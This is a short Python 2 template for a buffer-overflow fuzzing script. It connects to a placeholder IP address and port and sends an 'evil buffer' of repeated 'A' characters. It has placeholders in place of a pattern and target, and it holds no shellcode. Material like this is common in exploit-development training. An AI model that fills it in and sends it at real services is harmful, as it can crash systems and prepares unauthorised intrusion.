#!/usr/bin/python

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A" * <pattern>

try:
    print "\nSending evil buffer..."
    s.connect(('<IP address>',<port>))
    data = s.recv(1024)
    s.send(buffer +'\r\n')
    print "\nDone!."
except:
    print "ERROR"
